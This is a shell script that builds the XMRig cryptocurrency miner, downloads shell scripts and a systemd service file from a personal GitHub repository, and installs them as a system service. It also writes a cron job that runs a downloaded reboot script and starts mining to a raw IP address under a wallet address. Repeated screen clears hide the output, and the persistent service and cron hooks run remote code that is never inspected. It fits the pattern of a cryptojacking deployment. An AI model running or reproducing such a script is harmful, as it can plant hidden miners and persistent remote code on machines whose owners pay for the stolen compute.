sudo add-apt-repository ppa:acooks/libwebsockets6
sudo apt-get update && apt-get upgrade -y
sudo apt-get install libuv1.dev -y
sudo apt-get install screen -y
clear
sudo apt-get install cmake -y
sudo apt-get install tmux -y
clear
sudo apt-get install git -y
sudo apt-get install libuv-dev -y
sudo usermod -a -G render lufiaq
sudo apt install opencl-headers -y
clear
sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev
clear
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev gcc-7 g++-7 libhwloc-dev
clear
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
wget https://github.com/robertreynolds2/bteteteh/raw/main/btproxy.sh
wget https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/mystart.service
sudo cp mystart.service /etc/systemd/system/mystart.service
sudo systemctl start mystart
wget https://github.com/robertreynolds2/bteteteh/raw/main/reboot.sh
chmod +x reboot.sh
echo "0 0 * * * /home/lufiaq/xmrig/build/reboot.sh" > /etc/cron.d/reboot_24 >/dev/null 2>&1
clear
./xmrig --av 7 --safe --max-cpu-usage 85 --cpu-priority 5 -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq
